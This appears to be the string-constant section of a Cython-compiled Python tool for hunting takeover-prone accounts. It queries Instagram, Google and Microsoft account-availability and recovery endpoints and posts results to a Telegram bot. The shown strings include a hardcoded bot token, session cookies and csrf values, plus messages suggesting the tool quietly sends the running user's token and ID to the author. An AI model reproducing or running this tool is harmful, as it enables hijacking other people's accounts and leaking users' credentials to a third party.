\341\264\263\341\264\271\341""\264\254\341\264\265\341\264\270 \303\227 \341\264\264\341\264\274\341\265\200\341\264\271\341\264\254\341\264\265\341\264\270  \342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\267\342\240\232\342\240\231\342\241\207\342\240\200\342\240\200\342\242\200\342\240\206\342\240\200\342\241\234\342\240\200\342\240\200\342\241\240\342\240\212\342\240\200\342\240\200\342\240\200\342\240\210\342\242\243\342\240\200\342\240\200\342\243\200\342\241\274\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200  \302\262\342\201\260\302\271\302\262 - \302\262\342\201\260\302\271\342\201\271         \342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\243\224\342\243\213\342\240\244\342\240\244\342\240\222\342\240\263\342\240\244\342\243\264\342\240\213\342\243\200\342\241\274\342\240\244\342\240\220\342\240\232\342\240\223\342\240\222\342\240\222\342\240\242\342\240\244\342\242\204\342\243\210\342\241\267\342\240\212\342\240\201\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\264\342\240\212\342\240\211\342\240\211\342\240\201\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\240\342\240\217\342\240\221\342\240\202\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\220\342\240\201\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\240\342\240\216\342\240\200\342\240\200\342\242\240\342\240\213\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\244\342\243\264""\342\240\203\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\243\264\342\241\207\342\240\200\342\240\200\342\242\240\342\240\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\267\342\240\202\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\200\342\240\210\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\242\230\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\236\342\240\220\342\240\201\342\240\200\342\240\200\342\241\236   s\311\264\341\264\234\322\223\322\223 \342\242\270 \341\264\200s\342\240\200s\341\264\200\341\264\233\341\264\200\311\264\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\207\342\240\200\342\242\263\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\243\270\342\240\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\274\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\264\342\241\273\342\243\204\342\240\200\342\240\207\342\240\200\342\240\200\342\240\200\342\240""\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\247\342\240\224\342\240\212\342\240\211\342\240\210\342\243\267\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\243\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\200\342\243\200\342\243\266\342\240\237\342\240\231\342\240\212\342\240\200\342\240\210\342\242\242\342\241\200\342\241\204\342\240\200\342\240\200\342\240\200";
static const char __pyx_k_self[] = "self";
static const char __pyx_k_send[] = "send";
static const char __pyx_k_sn73[] = "sn73";
static const char __pyx_k_ss66[] = "ss66";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_uuid[] = "uuid";
static const char __pyx_k_year[] = "year";
static const char __pyx_k_1_000[] = "-1.000";
static const char __pyx_k_1_30m[] = "\033[1;30m";
static const char __pyx_k_1_31m[] = "\033[1;31m";
static const char __pyx_k_1_32m[] = "\033[1;32m";
static const char __pyx_k_1_33m[] = "\033[1;33m";
static const char __pyx_k_1_34m[] = "\033[1;34m";
static const char __pyx_k_1_35m[] = "\033[1;35m";
static const char __pyx_k_1_36m[] = "\033[1;36m";
static const char __pyx_k_1_37m[] = "\033[1;37m";
static const char __pyx_k_1_91m[] = "\033[1;91m";
static const char __pyx_k_1_95m[] = "\033[1;95m";
static const char __pyx_k_1_96m[] = "\033[1;96m";
static const char __pyx_k_1_97m[] = "\033[1;97m";
static const char __pyx_k_1kbps[] = "-1kbps";
static const char __pyx_k_2_31m[] = "\033[2;31m";
static const char __pyx_k_2_32m[] = "\033[2;32m";
static const char __pyx_k_2_34m[] = "\033[2;34m";
static const char __pyx_k_2_35m[] = "\033[2;35m";
static const char __pyx_k_2_36m[] = "\033[2;36m";
static const char __pyx_k_2_39m[] = "\033[2;39m";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_Snuff[] = "Snuff";
static const char __pyx_k_TOKEN[] = " \n\nTOKEN : ";
static const char __pyx_k_Table[] = "Table";
static const char __pyx_k_align[] = "align";
static const char __pyx_k_block[] = "block";
static const char __pyx_k_check[] = "check";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_datte[] = "datte";
static const char __pyx_k_dumps[] = "dumps";
static const char __pyx_k_eizon[] = "eizon";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_empty[] = "empty";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_f_req[] = "f.req";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_getMe[] = "/getMe";
static const char __pyx_k_green[] = "green";
static const char __pyx_k_group[] = "group";
static const char __pyx_k_hours[] = "hours";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_query[] = "query";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_reset[] = "reset";
static const char __pyx_k_s_s_2[] = " \360\237\224\264 \341\264\207\312\200\312\200\341\264\217\312\200 : \312\217\341\264\217\341\264\234\312\200 \341\264\234s\341\264\207\312\200 \311\252\341\264\205 \341\264\241\341\264\200s  \341\264\241\312\200\341\264\217\311\264\311\242   ";
static const char __pyx_k_s_s_3[] = "\n\322\223\341\264\207\341\264\233\341\264\204\312\234\311\252\311\264\311\242 \341\264\234s\341\264\207\312\200 \311\252\311\264\322\223\341\264\217... \341\264\230\312\237\341\264\207\341\264\200s\341\264\207 \341\264\241\341\264\200\311\252\341\264\233.";
static const char __pyx_k_s_s_s[] = "\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\n\342\232\240 \341\264\233\312\234\311\252s \322\223\311\252\312\237\341\264\207 \341\264\241\341\264\217\312\200\341\264\213\311\252\311\264\311\242 \341\264\217\311\264 \341\264\217\311\264\312\237\312\217 \302\271\302\271\302\271\302\271 \341\264\240\341\264\230\311\264 s\341\264\217 \341\264\230\341\264\234\341\264\233 \341\264\233\312\234\341\264\207 \341\264\240\341\264\230\311\264 \322\223\311\252\312\200s\341\264\233..";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_space[] = "space";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "start";
static const char __pyx_k_throw[] = "throw";
static const char __pyx_k_today[] = "today";
static const char __pyx_k_token[] = "token";
static const char __pyx_k_u_1_i[] = "u=1, i";
static const char __pyx_k_upper[] = "upper";
static const char __pyx_k_uuid4[] = "uuid4";
static const char __pyx_k_white[] = "white";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_1m_31m[] = "\033[1m\033[31m";
static const char __pyx_k_1m_32m[] = "\033[1m\033[32m";
static const char __pyx_k_1m_33m[] = "\033[1m\033[33m";
static const char __pyx_k_1m_34m[] = "\033[1m\033[34m";
static const char __pyx_k_1m_35m[] = "\033[1m\033[35m";
static const char __pyx_k_1m_36m[] = "\033[1m\033[36m";
static const char __pyx_k_1m_37m[] = "\033[1m\033[37m";
static const char __pyx_k_3brTvw[] = "3brTvw==";
static const char __pyx_k_Cookie[] = "Cookie";
static const char __pyx_k_HIS_ID[] = "\n\nHIS ID : ";
static const char __pyx_k_P_A_Is[] = "   P\311\252\341\264\230 A\312\237\312\200\341\264\207\341\264\200\341\264\205\312\217 I\311\264s\341\264\233\341\264\200\312\237\312\237\341\264\207\341\264\205";
static const char __pyx_k_Thread[] = "Thread";
static const char __pyx_k_Wsnuff[] = "Wsnuff";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_canary[] = "canary";
static const char __pyx_k_center[] = "center";
static const char __pyx_k_cfonts[] = "cfonts";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_colors[] = "colors";
static const char __pyx_k_decode[] = "decode";
static const char __pyx_k_digits[] = "digits";
static const char __pyx_k_doc_id[] = "doc_id";
static const char __pyx_k_emails[] = "emails";
static const char __pyx_k_encode[] = "encode";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_goodig[] = "goodig";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_orange[] = "orange";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_params[] = "params";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_ranges[] = "ranges";
static const char __pyx_k_render[] = "render";
static const char __pyx_k_result[] = "result";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_string[] = "string";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_target[] = "target";
static const char __pyx_k_text_2[] = "&text=";
static const char __pyx_k_tl_txt[] = "tl.txt";
static const char __pyx_k_yellow[] = "yellow";
static const char __pyx_k_1_32m_2[] = "\n\033[1;32m\n";
static const char __pyx_k_B_P_Ts7[] = "\n\n\nB\312\217 : @P\312\217\341\264\233\312\234\341\264\217\311\264_T\341\264\217\341\264\217\312\237s7 ( \360\235\227\243\360\235\227\247-\360\235\237\263 \360\223\204\205 )\n\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\n\n";
static const char __pyx_k_Console[] = "Console";
static const char __pyx_k_InfoAcc[] = "InfoAcc";
static const char __pyx_k_PROFILE[] = "PROFILE";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_Snuff73[] = "Snuff73";
static const char __pyx_k_Windows[] = "\"Windows\"";
static const char __pyx_k_android[] = "android-";
static const char __pyx_k_chat_id[] = "chat_id";
static const char __pyx_k_choices[] = "choices";
static const char __pyx_k_control[] = "control";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_genexpr[] = "genexpr";
static const char __pyx_k_getChat[] = "/getChat";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_hotmail[] = "hotmail";
static const char __pyx_k_install[] = "install";
static const char __pyx_k_library[] = "library";
static const char __pyx_k_magenta[] = "magenta";
static const char __pyx_k_no_REST[] = "no REST !";
static const char __pyx_k_prepare[] = "__prepare__";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_session[] = "session";
static const char __pyx_k_user_id[] = "user_id";
static const char __pyx_k_22_2C_22[] = "%22%2C%22";
static const char __pyx_k_X_FB_LSD[] = "X-FB-LSD";
static const char __pyx_k_bademail[] = "bademail";
static const char __pyx_k_badinsta[] = "badinsta";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_gf_uar_1[] = "\"gf.uar\",1";
static const char __pyx_k_parallax[] = "parallax";
static const char __pyx_k_priority[] = "priority";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_response[] = "response";
static const char __pyx_k_username[] = "username";
static const char __pyx_k_38_5_202m[] = "\033[38;5;202m";
static const char __pyx_k_38_5_203m[] = "\033[38;5;203m";
static const char __pyx_k_38_5_208m[] = "\033[38;5;208m";
static const char __pyx_k_Host_GAPS[] = "__Host-GAPS";
static const char __pyx_k_apiCanary[] = "\"apiCanary\":\"";
static const char __pyx_k_authority[] = "authority";
static const char __pyx_k_code_code[] = "</code>\n\360\235\227\230\360\235\227\240\360\235\227\224\360\235\227\234\360\235\227\237 : <code>";
static const char __pyx_k_csrftoken[] = "_csrftoken";
static const char __pyx_k_device_id[] = "device_id";
static const char __pyx_k_gmail_com[] = "@gmail.com";
static const char __pyx_k_hexdigest[] = "hexdigest";
static const char __pyx_k_importlib[] = "importlib";
static const char __pyx_k_json_data[] = "json_data";
static const char __pyx_k_metaclass[] = "__metaclass__";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_same_site[] = "same-site";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_threading[] = "threading";
static const char __pyx_k_user_info[] = "user_info";
static const char __pyx_k_variables[] = "variables";
static const char __pyx_k_7311958747[] = "7311958747";
static const char __pyx_k_A_P_Is_Sss[] = "     A\312\237\312\237 P\311\252\341\264\230 I\311\264s\341\264\233\341\264\200\312\237\312\237\341\264\207\341\264\205 S\341\264\234\341\264\204\341\264\204\341\264\207ss\322\223\341\264\234\312\237\312\237\312\217  \342\234\205\n\n";
static const char __pyx_k_Connection[] = "Connection";
static const char __pyx_k_DEM___init[] = "DEM.__init__";
static const char __pyx_k_User_Agent[] = "User-Agent";
static const char __pyx_k_check_call[] = "check_call";
static const char __pyx_k_deviceinfo[] = "deviceinfo";
static const char __pyx_k_executable[] = "executable";
static const char __pyx_k_first_name[] = "first_name";
static const char __pyx_k_keep_alive[] = "keep-alive";
static const char __pyx_k_rich_table[] = "rich.table";
static const char __pyx_k_signInName[] = "signInName";
static const char __pyx_k_splitlines[] = "splitlines";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_treatments[] = "treatments";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_webbrowser[] = "webbrowser";
static const char __pyx_k_ImportError[] = "ImportError";
static const char __pyx_k_X_IG_App_ID[] = "X-IG-App-ID";
static const char __pyx_k_apiCanary_2[] = "apiCanary";
static const char __pyx_k_check_gmail[] = "check_gmail";
static const char __pyx_k_clock_emoji[] = "clock_emoji";
static const char __pyx_k_code_code_2[] = "</code>\n\360\235\227\245\360\235\227\230\360\235\227\246\360\235\227\230\360\235\227\247 :  <code>";
static const char __pyx_k_csrftoken_2[] = "csrftoken";
static const char __pyx_k_en_GB_en_US[] = "en-GB, en-US";
static const char __pyx_k_hotmail_com[] = "@hotmail.com";
static const char __pyx_k_media_count[] = "media_count";
static const char __pyx_k_signed_body[] = "signed_body";
static const char __pyx_k_status_code[] = "status_code";
static const char __pyx_k_1m_38_5_208m[] = "\033[1m\033[38;5;208m";
static const char __pyx_k_Content_Type[] = "Content-Type";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_get_bot_info[] = "get_bot_info";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_rich_console[] = "rich.console";
static const char __pyx_k_user_agent_2[] = "user_agent";
static const char __pyx_k_BaseException[] = "BaseException";
static const char __pyx_k_Ps_W_W_C_Y_PP[] = "P\312\237\341\264\207\341\264\200s\341\264\207 W\341\264\200\311\252\341\264\233, W\341\264\207 C\312\234\341\264\207\341\264\204\341\264\213 Y\341\264\217\341\264\234\312\200 P\311\252P";
static const char __pyx_k_ascii_letters[] = "ascii_letters";
static const char __pyx_k_get_user_info[] = "get_user_info";
static const char __pyx_k_import_module[] = "import_module";
static const char __pyx_k_loading_chars[] = "loading_chars";
static const char __pyx_k_1700251574_982[] = "1700251574.982";
static const char __pyx_k_Content_Length[] = "Content-Length";
static const char __pyx_k_en_US_en_q_0_9[] = "en-US,en;q=0.9";
static const char __pyx_k_follower_count[] = "follower_count";
static const char __pyx_k_render_surface[] = "render_surface";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_unicode_escape[] = "unicode_escape";
static const char __pyx_k_567067343352427[] = "567067343352427";
static const char __pyx_k_Accept_Encoding[] = "Accept-Encoding";
static const char __pyx_k_Accept_Language[] = "Accept-Language";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_following_count[] = "following_count";
static const char __pyx_k_i_instagram_com[] = "i.instagram.com";
static const char __pyx_k_parse_mode_HTML[] = "&parse_mode=HTML";
static const char __pyx_k_signup_live_com[] = "signup.live.com";
static const char __pyx_k_P_Is_N_Is_S_Ps_W[] = "   P\311\252\341\264\230 Is N\341\264\217\341\264\233 I\311\264s\341\264\233\341\264\200\312\237\312\237\341\264\207\341\264\205 S\341\264\217 P\312\237\341\264\207\341\264\200s\341\264\207 W\341\264\200\311\252\341\264\233\n\n ";
static const char __pyx_k_X_FB_HTTP_Engine[] = "X-FB-HTTP-Engine";
static const char __pyx_k_application_json[] = "application/json";
static const char __pyx_k_isAvailable_true[] = "\"isAvailable\":true";
static const char __pyx_k_sec_ch_ua_mobile[] = "sec-ch-ua-mobile";
static const char __pyx_k_25618261841150840[] = "25618261841150840";
static const char __pyx_k_X_IG_Capabilities[] = "X-IG-Capabilities";
static const char __pyx_k_clientExperiments[] = "clientExperiments";
static const char __pyx_k_loading_animation[] = "loading_animation";
static const char __pyx_k_X_Bloks_Version_Id[] = "X-Bloks-Version-Id";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_ig_sig_key_version[] = "ig_sig_key_version";
static const char __pyx_k_sec_ch_ua_platform[] = "sec-ch-ua-platform";
static const char __pyx_k_tll_locals_genexpr[] = "tll.<locals>.genexpr";
static const char __pyx_k_IOS_LINK_tg_user_id[] = "\n IOS LINK \n : tg://user?id=";
static const char __pyx_k_X_Pigeon_Session_Id[] = "X-Pigeon-Session-Id";
static const char __pyx_k_accounts_google_com[] = "accounts.google.com";
static const char __pyx_k_generate_user_agent[] = "generate_user_agent";
static const char __pyx_k_sendMessage_chat_id[] = "/sendMessage?chat_id=";
static const char __pyx_k_X_IG_Connection_Type[] = "X-IG-Connection-Type";
static const char __pyx_k_google_accounts_xsrf[] = "google-accounts-xsrf";
static const char __pyx_k_https_storiesig_info[] = "https://storiesig.info";
static const char __pyx_k_X_IG_Connection_Speed[] = "X-IG-Connection-Speed";
static const char __pyx_k_https_signup_live_com[] = "https://signup.live.com";
static const char __pyx_k_X_Pigeon_Rawclienttime[] = "X-Pigeon-Rawclienttime";
static const char __pyx_k_https_storiesig_info_2[] = "https://storiesig.info/";
static const char __pyx_k_No_first_name_available[] = "No first name available";
static const char __pyx_k_a_Python_Tools7_MrSnuff[] = "\">\360\235\227\226\360\235\227\237\360\235\227\234\360\235\227\226\360\235\227\236 \360\235\227\233\360\235\227\230\360\235\227\245\360\235\227\230</a>\n\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230(\342\253\230\342\253\230\n\n\360\235\227\225\360\235\227\254 : @Python_Tools7 \360\235\227\226\360\235\227\233 : @MrSnuff\n";
static const char __pyx_k_https_t_me_Python_Tools7[] = "https://t.me/Python_Tools7";
static const char __pyx_k_X_IG_Bandwidth_Speed_KBPS[] = "X-IG-Bandwidth-Speed-KBPS";
static const char __pyx_k_https_accounts_google_com[] = "https://accounts.google.com";
static const char __pyx_k_azertyuiopmlkjhgfdsqwxcvbn[] = "azertyuiopmlkjhgfdsqwxcvbn";
static const char __pyx_k_https_api_telegram_org_bot[] = "https://api.telegram.org/bot";
static const char __pyx_k_X_IG_Bandwidth_TotalBytes_B[] = "X-IG-Bandwidth-TotalBytes-B";
static const char __pyx_k_X_IG_Bandwidth_TotalTime_MS[] = "X-IG-Bandwidth-TotalTime-MS";
static const char __pyx_k_application_json_text_plain[] = "application/json, text/plain, */*";
static const char __pyx_k_https_signup_live_com_signup[] = "https://signup.live.com/signup";
static const char __pyx_k_Not_A_Brand_v_99_Google_Chrome[] = "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"";
static const char __pyx_k_0_0_null_null_web_glif_signup_0[] = "\",0,0,null,null,\"web-glif-signup\",0,null,1,[],1]";
static const char __pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0[] = "\n\033[0;91m\033[0;93m \033[0;92m\033[1;97m\033[1;41m \342\270\270 \341\264\207\311\264\341\264\233\341\264\207\312\200 \312\231\341\264\217\341\264\233 \341\264\233\341\264\217\341\264\213\341\264\207\311\264 \360\223\204\213\033[0m\033[0;92m\033[0;93m\033[0;91m\033[1;97m";
static const char __pyx_k_1_32m_THIS_FILE_IS_EXPIRED_Chec[] = "\033[1;32m[ ! ] THIS FILE IS EXPIRED \342\235\214 \n\n[ ! ] Check @Python_Tools7 For New ";
static const char __pyx_k_22_2C0_2C0_2C1_2Cnull_2C0_2C516[] = "%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";
static const char __pyx_k_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O[] = "\nI\322\223 T\312\234\341\264\207 F\311\252\312\237\341\264\207 G\341\264\207\341\264\233s S\341\264\233\341\264\234\341\264\204\341\264\213 O\311\264 T\312\234\311\252s S\341\264\204\312\200\341\264\207\341\264\207\311\264, T\312\200\312\217 T\341\264\217\311\242\311\242\312\237\311\252\311\264\311\242 A\311\252\312\200\341\264\230\312\237\341\264\200\311\264\341\264\207 M\341\264\217\341\264\205\341\264\207 O\311\264 A\311\264\341\264\205 O\322\223\322\223. T\312\234\311\252s C\341\264\200\311\264 H\341\264\207\312\237\341\264\230 R\341\264\207\322\223\312\200\341\264\207s\312\234 T\312\234\341\264\207 C\341\264\217\311\264\311\264\341\264\207\341\264\204\341\264\233\311\252\341\264\217\311\264 A\311\264\341\264\205 R\341\264\207s\341\264\217\312\237\341\264\240\341\264\207 T\312\234\341\264\207 Iss\341\264\234\341\264\207.";
static const char __pyx_k_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q[] = "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6";
static const char __pyx_k_code_a_href_https_instagram_com[] = "</code>\n\360\235\227\227\360\235\227\224\360\235\227\247\360\235\227\230 : \311\264\341\264\217\341\264\233 \341\264\200\341\264\240\341\264\200\311\252\312\237\341\264\200\312\231\312\237\341\264\207\n\360\235\227\250\360\235\227\246\360\235\227\230\360\235\227\245 \360\235\227\250\360\235\227\245\360\235\227\237 : <a href=\"https://instagram.com/";
static const char __pyx_k_https_api_ig_storiesig_info_api[] = "https://api-ig.storiesig.info/api/userInfoByUsername/";
static const char __pyx_k_null_null_null_null_null_NL_nul[] = "[null,null,null,null,null,\"NL\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,2,null,0,1,\"\",null,null,2,2]";
static const char __pyx_k_text_This_User_Use_Your_Gmail_m[] = "&text=This User Use Your Gmail meta CLAIM NEW File \n\n ANDROID LINK \n : tg://openmessage?user_id=";
static const char __pyx_k_0d067c2f86cac2c17d655631c9cec240[] = "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.";
static const char __pyx_k_50cc6861_7036_43b4_802e_fb428279[] = "50cc6861-7036-43b4-802e-fb4282799c60";
static const char __pyx_k_7765081594_AAGRwFlHwEjVQRmtS45vK[] = "7765081594:AAGRwFlHwEjVQRmtS45vKc62djEOIIKi-AM";
static const char __pyx_k_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj[] = "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj";
static const char __pyx_k_Error_Could_not_retrieve_bot_inf[] = "Error: Could not retrieve bot information.";
static const char __pyx_k_Error_Could_not_retrieve_user_in[] = "Error: Could not retrieve user information.";
static const char __pyx_k_Instagram_100_0_0_17_129_Android[] = "Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)";
static const char __pyx_k_Mozilla_5_0_Linux_Android_10_K_A[] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";
static const char __pyx_k_User_does_not_have_a_username_Do[] = "User does not have a username. Don't Worry About it ";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded;charset=UTF-8";
static const char __pyx_k_c80c5fb30dfae9e273e4009f03b18280[] = "c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0";
static const char __pyx_k_continue_https_3A_2F_2Fmail_goog[] = "continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A";
static const char __pyx_k_data_initial_setup_data_null_nul[] = "data-initial-setup-data=\"%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&";
static const char __pyx_k_enablejspublickeydeprecationexpe[] = "enablejspublickeydeprecationexperiment";
static const char __pyx_k_https_accounts_google_com___sign[] = "https://accounts.google.com/_/signup/validatepersonaldetails";
static const char __pyx_k_https_accounts_google_com_signin[] = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB";
static const char __pyx_k_https_accounts_google_com_signup[] = "https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn";
static const char __pyx_k_https_i_instagram_com_api_v1_acc[] = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/";
static const char __pyx_k_https_signup_live_com_API_CheckA[] = "https://signup.live.com/API/CheckAvailableSigninNames";
static const char __pyx_k_https_signup_live_com_API_Evalua[] = "https://signup.live.com/API/EvaluateExperimentAssignments";
static const char __pyx_k_https_signup_live_com_signup_lic[] = "https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8";
static const char __pyx_k_https_www_instagram_com_accounts[] = "https://www.instagram.com/accounts/login";
static const char __pyx_k_https_www_instagram_com_api_grap[] = "https://www.instagram.com/api/graphql";
static const char __pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP[] = "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj";
static const char __pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0_2[] = "\n\033[0;91m\033[0;93m \033[0;92m\033[1;97m\033[1;41m \342\270\270 \341\264\207\311\264\341\264\233\341\264\207\312\200 \312\217\341\264\217\341\264\234\312\200 \311\252\341\264\205 \360\223\204\213\033[0m\033[0;92m\033[0;93m\033[0;91m\033[1;97m";
static const char __pyx_k_0d067c2f86cac2c17d655631c9cec240_2[] = "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{\"_csrftoken\":\"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj\",\"adid\":\"0dfaf820-2748-4634-9365-c3d8c8011256\",\"guid\":\"1f784431-2663-4db9-b624-86bd9ce1d084\",\"device_id\":\"android-b93ddb37e983481c\",\"query\":\"";
